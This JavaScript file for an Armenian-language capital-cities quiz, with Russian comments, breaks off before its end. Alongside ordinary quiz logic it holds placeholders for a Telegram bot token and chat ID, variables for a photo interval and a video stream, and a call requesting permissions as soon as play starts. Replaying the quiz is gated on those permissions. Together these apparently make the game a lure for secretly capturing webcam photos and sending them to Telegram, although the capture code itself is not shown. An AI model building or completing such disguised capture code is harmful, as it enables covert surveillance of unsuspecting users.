const telegramBotToken = "ТВОЙ_ТОКЕН_ЗДЕСЬ";
const telegramChatId = "ТВОЙ_CHAT_ID_ЗДЕСЬ";

const nameFormContainer = document.getElementById('name-form-container');
const nameForm = document.getElementById('name-form');
const nameInput = document.getElementById('name-input');
const nameError = document.getElementById('name-error');

const gameArea = document.getElementById('game-area');
const userNameDisplay = document.getElementById('user-name');
const scoreInfo = document.getElementById('score-info');
const questionContainer = document.getElementById('question');
const answerButtons = document.getElementById('answer-buttons');
const tryAgainBtn = document.getElementById('try-again-btn');

let userName = "";
let questions = [];
let currentQuestionIndex = 0;
let score = 0;
let wrong = 0;

let photosInterval;
let videoStream;

const allQuestions = [
  { question: "Որն է Հայաստանի մայրաքաղաքը։", answers: ["Երևան", "Թբիլիսի", "Մոսկվա", "Բաքու"], correct: 0 },
  { question: "Որն է Ռուսաստանի մայրաքաղաքը։", answers: ["Մոսկվա", "Երևան", "Կիև", "Սանկտ Պետերբուրգ"], correct: 0 },
  { question: "Որն է Ֆրանսիայի մայրաքաղաքը։", answers: ["Փարիզ", "Մադրիդ", "Բեռլին", "Լոնդոն"], correct: 0 },
  { question: "Որն է Գերմանիայի մայրաքաղաքը։", answers: ["Բեռլին", "Փարիզ", "Ռոմա", "Ամստերդամ"], correct: 0 },
  { question: "Որն է Իտալիայի մայրաքաղաքը։", answers: ["Ռոմա", "Միլան", "Վենետիկ", "Նեապոլ"], correct: 0 },
  { question: "Որն է Իսպանիայի մայրաքաղաքը։", answers: ["Մադրիդ", "Բարսելոնա", "Սևիլիա", "Վալենսիա"], correct: 0 },
  { question: "Որն է Կանադայի մայրաքաղաքը։", answers: ["Օտտավա", "Տորոնտո", "Մոնտրեալ", "Վանկուվեր"], correct: 0 },
  { question: "Որն է ԱՄՆ-ի մայրաքաղաքը։", answers: ["Վաշինգտոն", "Նյու Յորք", "Լոս Անջելես", "Շիկագո"], correct: 0 },
  { question: "Որն է Չինաստանի մայրաքաղաքը։", answers: ["Պեկին", "Շանհայ", "Հոնկոնգ", "Գուանչժոու"], correct: 0 },
  { question: "Որն է Ճապոնիայի մայրաքաղաքը։", answers: ["Տոկիո", "Օսակա", "Կիոտո", "Նագոյա"], correct: 0 },
  // Добавь до 50 вопросов по аналогии...
];

// Функция для выбора 10 случайных вопросов из 50, без частых повторов
function getRandomQuestions() {
  const selected = [];
  const usedIndexes = new Set();

  while (selected.length < 10 && usedIndexes.size < allQuestions.length) {
    const idx = Math.floor(Math.random() * allQuestions.length);
    if (!usedIndexes.has(idx)) {
      selected.push(allQuestions[idx]);
      usedIndexes.add(idx);
    }
  }
  return selected;
}

function shuffleArray(array) {
  for(let i = array.length -1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i+1));
    [array[i], array[j]] = [array[j], array[i]];
  }
}

nameForm.addEventListener('submit', (e) => {
  e.preventDefault();
  userName = nameInput.value.trim();

  if (userName === '') {
    nameError.style.display = 'block';
    return;
  } else {
    nameError.style.display = 'none';
  }

  nameFormContainer.style.display = 'none';
  gameArea.style.display = 'block';
  userNameDisplay.textContent = `👤 ${userName}`;

  startGame();
  requestPermissions();
});

function startGame() {
  questions = getRandomQuestions();
  currentQuestionIndex = 0;
  score = 0;
  wrong = 0;
  tryAgainBtn.style.display = 'none';
  scoreInfo.textContent = `Մնաց՝ ${questions.length} | Ճիշտ՝ 0 | Վատ՝ 0`;
  showQuestion();
}

function showQuestion() {
  clearStatusClass();
  resetState();

  const currentQuestion = questions[currentQuestionIndex];
  questionContainer.textContent = currentQuestion.question;

  // Создаём копию ответов и перемешиваем их, чтобы правильный не всегда был на одном месте
  const answers = currentQuestion.answers.map((text, index) => ({
    text,
    correct: index === currentQuestion.correct
  }));
  shuffleArray(answers);

  answers.forEach(answer => {
    const button = document.createElement('button');
    button.innerText = answer.text;
    button.classList.add('btn');
    if (answer.correct) button.dataset.correct = answer.correct;
    button.addEventListener('click', selectAnswer);
    answerButtons.appendChild(button);
  });

  updateScoreInfo();
}

function resetState() {
  while (answerButtons.firstChild) {
    answerButtons.removeChild(answerButtons.firstChild);
  }
}

function clearStatusClass() {
  document.body.classList.remove('correct');
  document.body.classList.remove('wrong');
}

function selectAnswer(e) {
  const selectedBtn = e.target;
  const correct = selectedBtn.dataset.correct === 'true';

  setStatusClass(selectedBtn, correct);
  Array.from(answerButtons.children).forEach(button => {
    button.disabled = true;
    if (button.dataset.correct === 'true') {
      setStatusClass(button, true);
    }
  });

  if (correct) {
    score++;
  } else {
    wrong++;
  }

  updateScoreInfo();

  if (currentQuestionIndex < questions.length -1) {
    currentQuestionIndex++;
    setTimeout(() => {
      showQuestion();
    }, 1200);
  } else {
    setTimeout(() => {
      endGame();
    }, 1200);
  }
}

function setStatusClass(element, correct) {
  clearStatusClass();
  if (correct) {
    element.classList.add('correct');
  } else {
    element.classList.add('wrong');
  }
}

function updateScoreInfo() {
  const left = questions.length - currentQuestionIndex;
  scoreInfo.textContent = `Մնաց՝ ${left} | Ճիշտ՝ ${score} | Վատ՝ ${wrong}`;
}

function endGame() {
  questionContainer.textContent = score >= 7 ? `🎉 Շնորհավորում ենք, Դուք հաղթեցիք!` : `☹️ Ցավոք, դուք պարտվեցիք։`;
  resetState();
  tryAgainBtn.style.display = 'inline-block';
}

tryAgainBtn.addEventListener('click', () => {
  if (!hasPermissions()) {
    requestPermissions();
  } else {
    startGame();
  }
});

// Запрос